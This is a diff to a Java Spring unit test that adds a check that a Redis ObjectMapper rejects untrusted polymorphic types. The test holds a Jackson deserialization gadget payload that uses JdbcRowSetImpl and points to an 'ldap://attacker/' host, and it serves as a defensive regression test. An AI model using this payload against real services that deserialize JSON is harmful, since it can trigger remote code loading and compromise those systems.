@@ -17,6 +17,7 @@ import java.util.Set;
 import java.util.UUID;
 
 import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions. assertThatThrownBy;
 
 /**
  * Unit tests for the Redis serialization configuration.
@@ -204,5 +205,15 @@ class CacheConfigTest {
         // Full integration coverage of the CacheManager is provided by @SpringBootTest tests
         // that exercise @Cacheable endpoints end-to-end.
         assertThat(CacheConfig.class).isNotNull();
+    }
+
+
+    @Test
+    @DisplayName("redisObjectMapper() rejects deserialization of disallowed classes")
+    void redisObjectMapper_rejectsUntrustedTypes() {
+        String maliciousJson = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/\"}";
+
+        assertThatThrownBy(() -> redisObjectMapper.readValue(maliciousJson, Object.class))
+                .isInstanceOf(com.fasterxml.jackson.databind.exc.InvalidTypeIdException.class);
     }
 }
